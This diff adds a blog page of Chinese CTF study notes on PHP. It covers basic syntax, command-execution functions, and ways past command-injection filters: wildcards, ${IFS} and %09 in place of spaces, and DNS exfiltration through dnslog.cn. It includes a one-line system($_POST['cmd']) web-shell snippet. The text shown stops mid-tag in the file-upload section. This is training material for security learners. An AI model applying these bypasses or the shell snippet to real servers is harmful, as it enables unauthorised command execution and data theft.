@@ -1,0 +1,1324 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>PHP - Sc0fie1d-Blog</title><meta name="Description" content="The official documentation for the Hugo DoIt theme"><meta property="og:title" content="PHP" />
+<meta property="og:description" content="一.PHP基础1 0x1 PHP基本概念即“超文本处理器”，是在服务器端行的脚本语言，尤其适用于web开发并可嵌入HTML中，适合中小型网站的开发。
+2 0x2 PHP环境phpstudy
+3 0x3PHP基础语法基础语法：函数名（函数参数）分号
+函数可以有0个或多个函数，无函数就不写
+有系统自带函数，用户也可以自定义函数
+用?来区分文件和参数部分
+参数部分用&amp;区分多个键值对
+单个键值对用=分割出 键和值
+echo 是一个语言结构，不是一个函数
+1 2 3 &lt;?php echo &#34;hello world&#34;; ?&gt; $_GET
+1 2 3 4 &lt;?php $a=$_GET[&#39;a&#39;]; echo $a; ?&gt; $_POST
+1 2 3 4 &lt;?php $a=$_POST[&#39;a&#39;]; echo $a; ?&gt; 自定义函数
+1 2 3 4 5 6 7 8 9 &lt;?php function add($a,$b) { return $a&#43;$b; } $a=$_POST[&#39;a&#39;]; $b=$_POST[&#39;b&#39;]; $c=add($a,$b); echo $c; ?&gt; 危险函数" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/php/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/><meta property="article:section" content="posts" />
+
+<meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"/>
+
+<meta name="twitter:title" content="PHP"/>
+<meta name="twitter:description" content="一.PHP基础1 0x1 PHP基本概念即“超文本处理器”，是在服务器端行的脚本语言，尤其适用于web开发并可嵌入HTML中，适合中小型网站的开发。
+2 0x2 PHP环境phpstudy
+3 0x3PHP基础语法基础语法：函数名（函数参数）分号
+函数可以有0个或多个函数，无函数就不写
+有系统自带函数，用户也可以自定义函数
+用?来区分文件和参数部分
+参数部分用&amp;区分多个键值对
+单个键值对用=分割出 键和值
+echo 是一个语言结构，不是一个函数
+1 2 3 &lt;?php echo &#34;hello world&#34;; ?&gt; $_GET
+1 2 3 4 &lt;?php $a=$_GET[&#39;a&#39;]; echo $a; ?&gt; $_POST
+1 2 3 4 &lt;?php $a=$_POST[&#39;a&#39;]; echo $a; ?&gt; 自定义函数
+1 2 3 4 5 6 7 8 9 &lt;?php function add($a,$b) { return $a&#43;$b; } $a=$_POST[&#39;a&#39;]; $b=$_POST[&#39;b&#39;]; $c=add($a,$b); echo $c; ?&gt; 危险函数"/>
+<meta name="application-name" content="DoIt">
+<meta name="apple-mobile-web-app-title" content="DoIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/php/" /><link rel="prev" href="http://scofield1920.github.io/pikachu_range_summary/" /><link rel="next" href="http://scofield1920.github.io/nssctf-web-wp/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "PHP",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/php\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "foundation, CTF, web","wordcount":  1072 ,
+        "url": "http:\/\/scofield1920.github.io\/php\/","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "scofied_lee"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d-Blog"><img
+        class="logo"
+        loading="lazy"
+        src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 2x"
+        sizes="auto"
+        alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" ><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d-Blog"><img
+        class="logo"
+        loading="lazy"
+        src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico 2x"
+        sizes="auto"
+        alt="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"
+        title="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" ><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x1-php基本概念">0x1 PHP基本概念</a></li>
+    <li><a href="#0x2-php环境">0x2 PHP环境</a></li>
+    <li><a href="#0x3php基础语法">0x3PHP基础语法</a></li>
+    <li><a href="#0x4-php的命令执行">0x4 PHP的命令执行</a>
+      <ul>
+        <li><a href="#php的command-exec函数">PHP的Command Exec函数</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x5-过滤与绕过">0x5 过滤与绕过</a>
+      <ul>
+        <li><a href="#黑名单过滤的绕过">◎黑名单过滤的绕过</a></li>
+        <li><a href="#符号过滤">◎符号过滤</a></li>
+        <li><a href="#不回显">◎不回显</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x6-php文件上传机制">0x6 PHP文件上传机制</a>
+      <ul>
+        <li><a href="#php弱类型比较">[php弱类型比较]</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#0x1-什么是php代码执行">0x1 什么是PHP代码执行</a></li>
+    <li><a href="#0x2-代码执行和命令执行的区别">0x2 代码执行和命令执行的区别</a></li>
+    <li><a href="#0x3-php代码执行的格式">0x3 PHP代码执行的格式</a>
+      <ul>
+        <li><a href="#1函数调用">1.函数调用</a></li>
+        <li><a href="#2类方法调用">2.类方法调用</a></li>
+        <li><a href="#3语言结构调用">3.语言结构调用</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x4-php代码执行后门">0x4 PHP代码执行后门</a></li>
+    <li><a href="#0x5-代码执行的类型">0x5 代码执行的类型</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#0x1何为包含">0x1何为包含：</a></li>
+        <li><a href="#0x2文件包含漏洞的产生">0x2文件包含漏洞的产生：</a></li>
+        <li><a href="#0x3文件包含语句">0x3文件包含语句：</a></li>
+        <li><a href="#0x4相关配置">0x4相关配置：</a></li>
+        <li><a href="#0x5伪协议">0x5伪协议：</a></li>
+        <li><a href="#0x6文件包含高级利用">0x6文件包含高级利用</a>
+          <ul>
+            <li><a href="#文件包含可控点">文件包含可控点</a></li>
+            <li><a href="#nginx日志包含">nginx日志包含</a></li>
+          </ul>
+        </li>
+        <li><a href="#临时文件包含">临时文件包含</a></li>
+        <li><a href="#session文件包含upload_progress文件上传">session文件包含（upload_progress文件上传）</a></li>
+        <li><a href="#pear文件包含">pear文件包含</a></li>
+        <li><a href="#远程文件包含">远程文件包含</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#0x1-何为文件上传">0x1 何为文件上传：</a></li>
+        <li><a href="#0x2-文件上传漏洞类型">0x2 文件上传漏洞类型</a></li>
+        <li><a href="#0x3-实例">0x3 实例</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">PHP</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">scofied_lee</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/web/"><i class="far fa-folder fa-fw"></i>web</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="0001-01-01">0001-01-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1072 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x1-php基本概念">0x1 PHP基本概念</a></li>
+    <li><a href="#0x2-php环境">0x2 PHP环境</a></li>
+    <li><a href="#0x3php基础语法">0x3PHP基础语法</a></li>
+    <li><a href="#0x4-php的命令执行">0x4 PHP的命令执行</a>
+      <ul>
+        <li><a href="#php的command-exec函数">PHP的Command Exec函数</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x5-过滤与绕过">0x5 过滤与绕过</a>
+      <ul>
+        <li><a href="#黑名单过滤的绕过">◎黑名单过滤的绕过</a></li>
+        <li><a href="#符号过滤">◎符号过滤</a></li>
+        <li><a href="#不回显">◎不回显</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x6-php文件上传机制">0x6 PHP文件上传机制</a>
+      <ul>
+        <li><a href="#php弱类型比较">[php弱类型比较]</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#0x1-什么是php代码执行">0x1 什么是PHP代码执行</a></li>
+    <li><a href="#0x2-代码执行和命令执行的区别">0x2 代码执行和命令执行的区别</a></li>
+    <li><a href="#0x3-php代码执行的格式">0x3 PHP代码执行的格式</a>
+      <ul>
+        <li><a href="#1函数调用">1.函数调用</a></li>
+        <li><a href="#2类方法调用">2.类方法调用</a></li>
+        <li><a href="#3语言结构调用">3.语言结构调用</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x4-php代码执行后门">0x4 PHP代码执行后门</a></li>
+    <li><a href="#0x5-代码执行的类型">0x5 代码执行的类型</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#0x1何为包含">0x1何为包含：</a></li>
+        <li><a href="#0x2文件包含漏洞的产生">0x2文件包含漏洞的产生：</a></li>
+        <li><a href="#0x3文件包含语句">0x3文件包含语句：</a></li>
+        <li><a href="#0x4相关配置">0x4相关配置：</a></li>
+        <li><a href="#0x5伪协议">0x5伪协议：</a></li>
+        <li><a href="#0x6文件包含高级利用">0x6文件包含高级利用</a>
+          <ul>
+            <li><a href="#文件包含可控点">文件包含可控点</a></li>
+            <li><a href="#nginx日志包含">nginx日志包含</a></li>
+          </ul>
+        </li>
+        <li><a href="#临时文件包含">临时文件包含</a></li>
+        <li><a href="#session文件包含upload_progress文件上传">session文件包含（upload_progress文件上传）</a></li>
+        <li><a href="#pear文件包含">pear文件包含</a></li>
+        <li><a href="#远程文件包含">远程文件包含</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#0x1-何为文件上传">0x1 何为文件上传：</a></li>
+        <li><a href="#0x2-文件上传漏洞类型">0x2 文件上传漏洞类型</a></li>
+        <li><a href="#0x3-实例">0x3 实例</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="一php基础" class="headerLink">
+    <a href="#%e4%b8%80php%e5%9f%ba%e7%a1%80" class="header-mark"></a>一.PHP基础</h1><h2 id="0x1-php基本概念" class="headerLink">
+    <a href="#0x1-php%e5%9f%ba%e6%9c%ac%e6%a6%82%e5%bf%b5" class="header-mark"></a>1 0x1 PHP基本概念</h2><p>即“超文本处理器”，是在服务器端行的脚本语言，尤其适用于web开发并可嵌入HTML中，适合中小型网站的开发。</p>
+<h2 id="0x2-php环境" class="headerLink">
+    <a href="#0x2-php%e7%8e%af%e5%a2%83" class="header-mark"></a>2 0x2 PHP环境</h2><p>phpstudy</p>
+<h2 id="0x3php基础语法" class="headerLink">
+    <a href="#0x3php%e5%9f%ba%e7%a1%80%e8%af%ad%e6%b3%95" class="header-mark"></a>3 0x3PHP基础语法</h2><p>基础语法：函数名（函数参数）分号</p>
+<p>函数可以有0个或多个函数，无函数就不写</p>
+<p>有系统自带函数，用户也可以自定义函数</p>
+<p>用?来区分文件和参数部分</p>
+<p>参数部分用&amp;区分多个键值对</p>
+<p>单个键值对用=分割出 键和值</p>
+<p>echo 是一个语言结构，不是一个函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">echo &#34;hello world&#34;;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>$_GET</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$a=$_GET[&#39;a&#39;];
+</span></span><span class="line"><span class="cl">echo $a;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>$_POST</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$a=$_POST[&#39;a&#39;];
+</span></span><span class="line"><span class="cl">echo $a;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>自定义函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">function add($a,$b) {
+</span></span><span class="line"><span class="cl">return $a+$b;
+</span></span><span class="line"><span class="cl">}
+</span></span><span class="line"><span class="cl">$a=$_POST[&#39;a&#39;];
+</span></span><span class="line"><span class="cl">$b=$_POST[&#39;b&#39;];
+</span></span><span class="line"><span class="cl">$c=add($a,$b);
+</span></span><span class="line"><span class="cl">echo $c;
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>危险函数</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?php
+</span></span><span class="line"><span class="cl">$cmd=$_POST[&#39;cmd&#39;];
+</span></span><span class="line"><span class="cl">system($cmd);
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="0x4-php的命令执行" class="headerLink">
+    <a href="#0x4-php%e7%9a%84%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="header-mark"></a>4 0x4 PHP的命令执行</h2><p>命令执行一般指目标服务器上的命令执行，也就是远程命令执行。
+英文缩写为RCE</p>
+<p>◎Remote Command Exec
+◎Remote Code Exec</p>
+<p>默认讨论的服务器系统为Linux</p>
+<p>shell的分号**；<strong>来拆分命令，与</strong>&amp;&amp;**(url编码为%26%26，也可以分隔命令)的区别是：
+**&amp;&amp;<strong>需要前面命令执行成功后后面的命令才会执行(短路)，</strong>；**则不管成功与否，两个命令作为两行命令来执行
+||也表示或，但不短路</p>
+<h3 id="php的command-exec函数" class="headerLink">
+    <a href="#php%e7%9a%84command-exec%e5%87%bd%e6%95%b0" class="header-mark"></a>4.1 PHP的Command Exec函数</h3><p>官方中有6种函数可执行系统命令</p>
+<p>◎system
+◎passthru
+◎exec
+◎shell_exec
+◎popen
+◎pcntl_exec</p>
+<h2 id="0x5-过滤与绕过" class="headerLink">
+    <a href="#0x5-%e8%bf%87%e6%bb%a4%e4%b8%8e%e7%bb%95%e8%bf%87" class="header-mark"></a>5 0x5 过滤与绕过</h2><h3 id="黑名单过滤的绕过" class="headerLink">
+    <a href="#%e9%bb%91%e5%90%8d%e5%8d%95%e8%bf%87%e6%bb%a4%e7%9a%84%e7%bb%95%e8%bf%87" class="header-mark"></a>5.1 ◎黑名单过滤的绕过</h3><p>替换过滤，<u>双写绕过</u></p>
+<p><u>通配符</u>*指代任意长度的字符</p>
+<p>？表示占位符，只指一个字符</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">error_reporting(0);        //隐藏报错
+</span></span><span class="line"><span class="cl">highlight_file(_FILE_);    //高亮显示源码
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>当我们遇到<u>过滤flag关键字</u>的时候，我们可以用通配符绕过</p>
+<p>如果遇到过滤读取文件命令的情况，我们可以替换使用不熟悉但有类似作用的命令</p>
+<p>在Linux环境中，反引号 <code>’  ‘</code>  表示执行</p>
+<p>如果所有读取文件命令都被过滤，可以通过组合的形式来执行，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ls &#39;echo /bin&#39;  等效于  ls /bin   
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>甚至可以<img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004182108822.png" alt="image-20221004182108822" style="zoom: 67%;" />
+（构造复合语法，通过base64编码等方法）
+如果base64和echo也被过滤，可以通过变量拼接来绕过关键字
+例如<img src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004191724118.png" alt="image-20221004191724118" style="zoom: 80%;" /></p>
+<h3 id="符号过滤" class="headerLink">
+    <a href="#%e7%ac%a6%e5%8f%b7%e8%bf%87%e6%bb%a4" class="header-mark"></a>5.2 ◎符号过滤</h3><p>1.过滤空格的情况
+(1)读取文件时，使用<code>&lt;&gt;</code>代替空格
+(2)使用<code>${IFS}</code>代替空格，也可以使用<code>$IFS$9</code>代替空格，bash下甚至可以使用<code>{cmd,args}</code>代替空格
+(3)控制字符代替空格<code>%09  %0b  %0c</code>
+(4)字符串截取空格
+(5)当然也可以通过burp来爆破一下可用字符表示空格
+<figure><a class="lightgallery" href="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209032135840.png" title="image-20220903213502790" data-thumbnail="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209032135840.png">
+        <img
+            
+            loading="lazy"
+            src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209032135840.png"
+            srcset="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209032135840.png, https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209032135840.png 1.5x, https://blog-1308152021.cos.ap-beijing.myqcloud.com/image/202209032135840.png 2x"
+            sizes="auto"
+            alt="image-20220903213502790">
+    </a></figure></p>
+<h3 id="不回显" class="headerLink">
+    <a href="#%e4%b8%8d%e5%9b%9e%e6%98%be" class="header-mark"></a>5.3 ◎不回显</h3><p>能把不回显的数据传输出来让我们看到所用到的数据传输路径，叫做通道</p>
+<p>认识一个危险函数：shell_exec
+和system函数的区别：shell_exec并不把执行结果输出到当前页面，而是作为字符串返回，如果页面没有事输出这个字符串，我们则看不到结果。</p>
+<p>(1)<strong>写入文件、二次返回</strong>(基于文件的数据带出)</p>
+<p>无法直接看到信息，将信息写入文件，在通过读取文件进行信息获得
+比如写入1.txt，再访问url+1.txt就可实现数据传回
+在shell中，我们可以使用&gt;符号来写文件</p>
+<p>(2)<strong>DNS通道</strong></p>
+<p>如果当前目录不可写入,可通过DNS解析记录将数据传回</p>
+<p><a href="http://www.dnslog.cn/" target="_blank" rel="noopener noreferrer">http://www.dnslog.cn/</a></p>
+<h2 id="0x6-php文件上传机制" class="headerLink">
+    <a href="#0x6-php%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e6%9c%ba%e5%88%b6" class="header-mark"></a>6 0x6 PHP文件上传机制</h2><p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004223546812.png" title="image-20221004223546812" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004223546812.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004223546812.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004223546812.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004223546812.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004223546812.png 2x"
+            sizes="auto"
+            alt="image-20221004223546812">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004223743505.png" title="image-20221004223743505" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004223743505.png">
+        <img
+            
+            loading="lazy"
+            src="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004223743505.png"
+            srcset="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004223743505.png, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004223743505.png 1.5x, https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004223743505.png 2x"
+            sizes="auto"
+            alt="image-20221004223743505">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224251811.png" title="image-20221004224251811" data-thumbnail="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20221004224251811.png">
+        <img
+            
+            loading="lazy"
